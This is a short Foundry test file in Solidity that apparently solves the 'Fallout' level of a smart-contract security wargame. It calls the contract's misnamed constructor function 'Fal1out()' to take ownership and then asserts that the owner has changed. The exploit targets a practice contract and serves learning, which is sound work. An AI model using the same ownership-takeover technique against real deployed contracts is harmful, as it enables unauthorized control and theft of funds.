// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level02.sol";

contract AttackerFalloutTest is Test {
    function testLevel02() external {
        vm.prank(address(0x1));
        Fallout level02 = new Fallout();

        console.log("Current Owner is: ", level02.owner());

        assertFalse(level02.owner() == address(this));
        level02.Fal1out();
        assertTrue(level02.owner() == address(this));

        console.log("New Owner is: ", level02.owner());
    }
}
